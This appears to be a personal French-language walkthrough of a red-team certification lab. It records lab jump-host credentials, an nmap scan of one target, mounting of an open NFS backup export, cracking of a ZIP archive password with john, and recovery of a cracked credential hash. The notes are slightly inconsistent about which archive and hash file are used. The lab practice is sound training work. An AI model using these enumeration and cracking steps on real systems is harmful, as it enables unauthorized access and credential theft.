SUMMUS: Extreme Red Teamer Lab
https://extremeredlab.0x29a.it/redteamlabs

![[20250825134143.png]]

## Présentation du laboratoire

Notre laboratoire de certification est structuré pour tester les compétences pratiques et stratégiques requises pour fonctionner comme un véritable laboratoire Extreme Red Teamer.

Les candidats seront confrontés à des scénarios avancés qui incluent :

- Linux et Windows : exploits et élévation des privilèges
- Active Directory : attaques avancées et persistance
- Pivotement extrême : mouvement latéral dans des réseaux complexes
- Mise en réseau : manipuler les paquets dans les réseaux
- Sécurité du cloud : vulnérabilités et erreurs de configuration dans GCP, AWS et Azure
- Vulnérabilités du monde réel : exploiter les failles de sécurité

La réussite du laboratoire nécessite des compétences techniques avancées, une pensée critique et une adaptabilité.


Machine Kali Jump :
🔹 Serveur : 10.0.1.200
🔹 Utilisateur : red
🔹 Mot de passe : I'mthebest

je  me suis connecte sur la machine 
# Machine 1  :  10.0.1.7
# Enumeration
## nmap 

```
nmap -sV -p- 10.0.1.7 -vv
```

```
PORT      STATE SERVICE         REASON         VERSION
22/tcp    open  ssh             syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u4 (protocol 2.0)
111/tcp   open  rpcbind         syn-ack ttl 64 2-4 (RPC #100000)
540/tcp   open  uucp            syn-ack ttl 64 NetBSD uucpd
2049/tcp  open  nfs_acl         syn-ack ttl 64 3 (RPC #100227)
4444/tcp  open  krb524?         syn-ack ttl 64
4455/tcp  open  tcpwrapped      syn-ack ttl 64
8000/tcp  open  http            syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 3.11.7)
8080/tcp  open  http            syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 3.11.2)
30000/tcp open  ndmps?          syn-ack ttl 64
36267/tcp open  nlockmgr        syn-ack ttl 64 1-4 (RPC #100021)
40000/tcp open  ssl/safetynetp? syn-ack ttl 64
41137/tcp open  status          syn-ack ttl 64 1 (RPC #100024)
41991/tcp open  mountd          syn-ack ttl 64 1-3 (RPC #100005)
50115/tcp open  mountd          syn-ack ttl 64 1-3 (RPC #100005)
59971/tcp open  mountd          syn-ack ttl 64 1-3 (RPC #100005)
```


Comme indiqué ci-dessus, la cible exécute NFS, ce qui permet une énumération plus poussée.

Nous avons interroge le demon de moontage sur un hote distant obtenir des informations sur l'etat du serveur NFS de la machine 
```
red@start:~$ showmount -e 10.0.1.7
Export list for 10.0.1.7:
/var/backup *

```

Comme indiqué ci-dessus dans la liste d'exportation reçue de la cible, un répertoire  `/var/backup *`  est disponible pour le montage.

```
red@start:/tmp$ mkdir  /tmp/mount
sudo mount -t nfs 10.0.1.7:/var/backup /tmp/mount
mount | grep /tmp/mount
mount | grep /tmp/mount

```

ls    
etc.zip  mfa.zip  NOTES  zi7zp9Uv

sudo zip2john mfa.zip > zip_hash.txt


john --wordlist=/home/kali/Documents/TryHackme/Wordlist/rockyou.txt zip_hashetc.txt 

Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
05ultra          (etc.zip)     
1g 0:00:00:03 DONE (2025-11-29 17:52) 0.3039g/s 4250Kp/s 4250Kc/s 4250KC/s 0606299330727..0591DUB10
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 


cat apache_credentials 
jump:extremeRTlabs:0b90b1df56afe6e06ed887c4f5f3528f


0b90b1df56afe6e06ed887c4f5f3528f : 	THERESE

